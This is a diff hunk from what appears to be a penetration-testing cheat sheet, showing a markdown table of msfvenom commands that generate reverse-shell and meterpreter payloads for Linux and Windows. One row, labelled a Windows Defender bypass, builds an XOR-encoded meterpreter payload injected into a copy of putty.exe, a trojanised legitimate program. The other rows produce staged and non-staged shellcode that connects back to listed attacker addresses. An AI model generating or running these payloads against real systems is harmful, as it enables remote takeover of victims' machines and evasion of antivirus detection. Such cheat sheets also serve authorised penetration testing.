@@ -292,7 +292,5 @@ impacket:
 | Linux - x86 reverse shell       | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`                                                                                                                                       |     |     |
 | Linux - x64 reverse shell       | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`                                                                                                                                       |     |     |
 | Putty.exe WinDef Bypass         | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k` |     |     |
-| 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                         |     |     |
-| 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                   
-
-
+| 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                        
+| 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                        
